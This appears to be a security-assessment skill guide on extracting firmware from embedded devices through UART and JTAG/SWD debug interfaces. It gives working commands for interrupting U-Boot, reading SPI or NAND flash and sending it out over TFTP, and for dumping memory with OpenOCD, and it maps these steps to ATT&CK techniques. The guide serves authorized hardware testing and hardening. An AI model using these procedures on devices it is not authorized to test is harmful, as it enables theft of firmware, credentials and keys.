---
name: extracting-firmware-via-uart-and-jtag-interfaces
description: Extracts firmware directly from embedded hardware through on-board debug interfaces by locating and probing UART pads (TX/RX/GND/VCC) with a multimeter and logic analyzer, detecting the serial baud rate, dropping into bootloader and U-Boot shells, and performing JTAG/SWD memory dumps with OpenOCD and a JTAGulator. Covers physical pinout identification, voltage-level safety, and turning a debug console into a full flash read.
domain: cybersecurity
subdomain: firmware-analysis
tags:
- firmware
- uart
- jtag
- swd
- openocd
- hardware-hacking
- debug-interfaces
- bootloader
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- ID.AM-08
- ID.RA-01
- PR.PS-01
- DE.CM-01
mitre_attack:
- T1200
- T1542
- T1078
---
# Extracting Firmware via UART and JTAG Interfaces

> **Authorized Use Only:** Only probe, console into, or dump firmware from hardware you own or are explicitly authorized in writing to test. Opening a device, soldering to test points, or reading flash may void warranties, violate the DMCA and vendor terms, and damage hardware. Respect copyright and licensing of any firmware you extract, and follow ESD-safe and electrical-safety practice.

## Overview

Most embedded and IoT devices ship with debug interfaces left enabled on the PCB because manufacturers use them in production and field repair. The two most valuable are **UART** (a low-speed asynchronous serial console, usually a 4-pad header: TX, RX, GND, VCC) and **JTAG/SWD** (boundary-scan and on-chip debug interfaces that expose direct read/write access to CPU registers, RAM, and memory-mapped flash). An attacker or analyst who reaches these interfaces can read the bootloader banner, interrupt autoboot to obtain a root or U-Boot shell, and ultimately read the entire flash without ever desoldering a chip. This maps to MITRE ATT&CK **T1200 — Hardware Additions** (introducing a probe/adapter onto the target board) and **T1542 — Pre-OS Boot** (interacting with the bootloader before the operating system loads), and the credentials and keys recovered frequently enable **T1078 — Valid Accounts**.

UART work begins physically: candidate pads are identified by inspection (4 closely spaced through-holes or test points), then characterized with a **multimeter** (GND is continuous with shielding/electrolytic-cap negative; VCC sits steady at 3.3 V or 1.8 V; TX idles high and "wiggles" at boot; RX is high-impedance) and confirmed with a **logic analyzer** capturing the boot chatter. Baud rate is recovered either by measuring the narrowest pulse (bit time) on the analyzer or by sweeping common rates until the console prints clean ASCII. Once a console is up, interrupting U-Boot autoboot exposes `md` (memory display), `sf`/`nand` (raw flash read), and `tftpput`/`loady` for exfiltration.

JTAG/SWD is used when UART is locked, password-protected, or absent. A **JTAGulator** or **JTAGenum** identifies the TDI/TDO/TMS/TCK/TRST (or SWDIO/SWCLK) lines among unknown pads by brute-forcing pin permutations. **OpenOCD** then attaches via an adapter (FT2232H-based, ST-Link, J-Link, or Raspberry Pi bit-bang), halts the core, and dumps internal or external flash with `dump_image`/`flash read_bank`. Many SoCs gate these interfaces behind read-out protection (RDP) or fuses; recognizing those defenses is part of the assessment.

## When to Use

- Performing an authorized hardware security assessment of an IoT, router, camera, or industrial device.
- The firmware is not downloadable from the vendor and you need an on-device extraction path.
- A SPI flash chip-off dump is impractical (BGA/eMMC, conformal coating) and the SoC exposes JTAG/SWD.
- You need a live console (U-Boot or Linux) to inspect boot arguments, environment variables, and runtime state.
- Validating that a product correctly disables debug interfaces and read-out protection before shipping.
- Recovering bootloader environment, kernel command line, or board configuration that only exists in NVRAM.

## Prerequisites

- A 3.3 V (and ideally 1.8 V capable) **USB-to-UART adapter** — FT232H/FT2232H, CP2102, or CH340 based. Never use a 5 V TTL adapter on a 3.3 V/1.8 V target.
- A **multimeter** (continuity + DC voltage) and, strongly recommended, a **logic analyzer** (e.g. Saleae or an FX2-based clone driven by `sigrok`/PulseView).
- **JTAGulator** (or an Arduino/Pi running `JTAGenum`) for pinout discovery, plus a JTAG/SWD adapter: FT2232H, ST-Link V2, or SEGGER J-Link.
- Software toolchain:
  ```bash
  sudo apt install minicom screen picocom openocd sigrok-cli pulseview
  pip install pyserial
  # OpenOCD from source for newest targets:
  # git clone https://github.com/openocd-org/openocd && cd openocd && ./bootstrap && ./configure && make -j
  ```
- Soldering iron, fine wire, jumper leads with hooks/probes, and an ESD-safe workspace.
- Written authorization to open and test the target device.

## Objectives

- Physically locate and label the UART pads (TX, RX, GND, VCC) and the JTAG/SWD lines.
- Determine the correct logic voltage and never connect VCC from the adapter to a powered board.
- Recover the UART baud rate and capture the boot log to a console.
- Interrupt autoboot to obtain a U-Boot or root shell and read flash over the wire.
- Identify JTAG/SWD with a JTAGulator and dump internal/external memory with OpenOCD.
- Document read-out-protection state and recommend disabling production debug interfaces.

## MITRE ATT&CK Mapping

| ID | Name | Tactic | Where it shows up |
|----|------|--------|-------------------|
| T1200 | Hardware Additions | Initial Access | Attaching a UART/JTAG probe or adapter to the target PCB. |
| T1542 | Pre-OS Boot | Defense Evasion / Persistence | Interrupting the bootloader (U-Boot) before the OS loads to gain a shell and read flash. |
| T1078 | Valid Accounts | Initial Access / Privilege Escalation | Reusing credentials/keys recovered from the console or flash dump. |

## Workflow

### 1. Identify candidate UART pads with a multimeter

Power the board off first. Set the multimeter to continuity and find **GND** (continuous with shield/USB ground or a large cap's negative pad). Then power on and switch to DC volts referenced to that GND: **VCC** reads a steady 3.3 V (or 1.8 V); **TX** sits near VCC at idle but momentarily dips/flickers as the boot message streams; **RX** floats and barely moves.

```bash
# Multimeter probing checklist (manual measurement):
#   Pad 1 -> GND   : 0 V, continuous with chassis/USB shield
#   Pad 2 -> VCC   : steady 3.3 V (or 1.8 V) -- DO NOT wire this to the adapter
#   Pad 3 -> TX    : idles ~VCC, brief drops during boot (data out of device)
#   Pad 4 -> RX    : high-impedance, ~floating

# Rank candidate pinouts heuristically from your voltage notes:
python3 scripts/agent.py pinout \
  --pads "p1=0.0,p2=3.30,p3=3.28,p4=2.9" --voltage 3.3
```

### 2. Confirm TX and recover baud with a logic analyzer

Capture the boot chatter on the suspected TX pad. The narrowest pulse equals one bit time; baud = 1 / bit_time. `sigrok` can auto-decode UART once you give it a guess.

```bash
# Capture 1s at 2 MHz on channel D0 (suspected TX), 3.3V logic:
sigrok-cli --driver fx2lafw --channels D0 \
  --config samplerate=2m --samples 2000000 --output-file boot.sr

# Try to decode UART; sweep baud if needed:
sigrok-cli -i boot.sr -P uart:rx=D0:baudrate=115200 -A uart

# If you only have a raw timing capture, estimate baud from the shortest pulse:
python3 scripts/agent.py baud --pulse-us 8.68      # -> ~115200
```

### 3. Open the console and capture the boot log

Wire adapter GND↔board GND, adapter RX↔board TX, adapter TX↔board RX (cross-over). Leave VCC disconnected. Open a terminal and power-cycle the board.

```bash
# picomom/screen/minicom all work; log everything to a file:
picocom -b 115200 -l /dev/ttyUSB0 | tee boot_console.log
# or:
screen /dev/ttyUSB0 115200
# or scripted, dependency-light, via the helper:
python3 scripts/agent.py console --port /dev/ttyUSB0 --baud 115200 --log boot_console.log
```

### 4. Interrupt autoboot and read flash from U-Boot

Most U-Boot builds print "Hit any key to stop autoboot". Mash a key to drop to the `=>` prompt, then read raw flash and exfiltrate it.

```bash
# At the U-Boot '=>' prompt:
printenv                       # dump environment (bootargs, IP, mtdparts)
sf probe 0                     # init SPI flash
sf read 0x82000000 0x0 0x800000   # read 8 MiB of flash into RAM at 0x82000000
# Exfiltrate the RAM region over TFTP to your host (run a tftp server on .10):
setenv ipaddr 192.168.1.20; setenv serverip 192.168.1.10
tftpput 0x82000000 0x800000 firmware_dump.bin
# For NAND devices:  nand read 0x82000000 0x0 0x800000
# md (memory display) can also be screen-scraped if no network is available:
md.b 0x82000000 0x100
```

### 5. Discover JTAG/SWD pinout when UART is locked

If the console is password-protected or absent, brute-force the JTAG lines on unknown pads with a JTAGulator (BYPASS/IDCODE scan) or `JTAGenum` on a microcontroller.

```bash
# JTAGulator (over its own USB serial console): set target voltage then scan
#   v   -> set target I/O voltage (e.g. 3.3)
#   i   -> IDCODE scan (finds TDO + TCK; fast)
#   b   -> BYPASS scan (finds full TDI/TDO/TMS/TCK; thorough)
# It reports e.g.:  TDI=2 TDO=4 TMS=3 TCK=5  IDCODE=0x4ba00477 (ARM Cortex-M)
screen /dev/ttyACM0 115200
```

### 6. Halt the core and dump memory with OpenOCD

Attach OpenOCD with the matching interface + target config, halt, and dump internal flash or memory-mapped external flash.

```bash
# Example: FT2232H adapter against an STM32F4 target
openocd -f interface/ftdi/ft2232h-module-swd.cfg -f target/stm32f4x.cfg

# In another terminal, drive OpenOCD over its telnet port:
telnet localhost 4444
> reset halt
> flash banks                         # list flash banks and sizes
> dump_image internal_flash.bin 0x08000000 0x100000   # dump 1 MiB internal flash
> flash read_bank 0 ext_flash.bin 0 0x800000          # dump 8 MiB ext bank
> mdw 0x08000000 4                     # spot-check the first words
# Note: if 'reset halt' fails or reads return 0xFFFFFFFF, the chip likely has
# read-out protection (STM32 RDP level 1/2) or debug fuses set -- record this.
```

## Tools and Resources

| Resource | Link |
|----------|------|
| OpenOCD (Open On-Chip Debugger) | https://openocd.org/ |
| OpenOCD source / targets | https://github.com/openocd-org/openocd |
| JTAGulator (Grand Idea Studio) | http://www.grandideastudio.com/jtagulator/ |
| JTAGenum | https://github.com/cyphunk/JTAGenum |
| sigrok / PulseView logic analysis | https://sigrok.org/ |
| U-Boot documentation | https://docs.u-boot.org/ |
| OWASP Firmware Security Testing Methodology (FSTM) | https://github.com/scriptingxss/owasp-fstm |

## Debug Interface Pinout Reference

| Interface | Lines | Typical voltage | Notes |
|-----------|-------|-----------------|-------|
| UART | TX, RX, GND, (VCC) | 3.3 V / 1.8 V | TX idles high; cross TX↔RX; never source VCC into a powered board. |
| JTAG | TDI, TDO, TMS, TCK, (TRST) | 3.3 V / 1.8 V | IDCODE/BYPASS scan finds order; nTRST/nSRST optional. |
| SWD | SWDIO, SWCLK, GND, (nRESET) | 3.3 V / 1.8 V | 2-wire ARM debug; common on Cortex-M; SWO is optional trace. |
| SPI (debug) | CS, CLK, MOSI, MISO | 3.3 V / 1.8 V | Sometimes exposed for in-circuit flash read (see SPI skill). |

## Validation Criteria

- [ ] UART GND, VCC, TX, and RX pads identified and labeled by multimeter measurement.
- [ ] Adapter logic voltage matched to the target (3.3 V/1.8 V); VCC left disconnected.
- [ ] Baud rate recovered (analyzer or sweep) and a clean boot log captured to file.
- [ ] Autoboot interrupted; U-Boot or root shell obtained (or documented as locked).
- [ ] Flash read from the console (`sf read`/`nand read`) or memory dumped via OpenOCD.
- [ ] JTAG/SWD pinout discovered with JTAGulator/JTAGenum when UART unavailable.
- [ ] Read-out-protection / fuse state recorded and a hardening recommendation written.
- [ ] Extracted image hashed and stored with chain-of-custody notes.
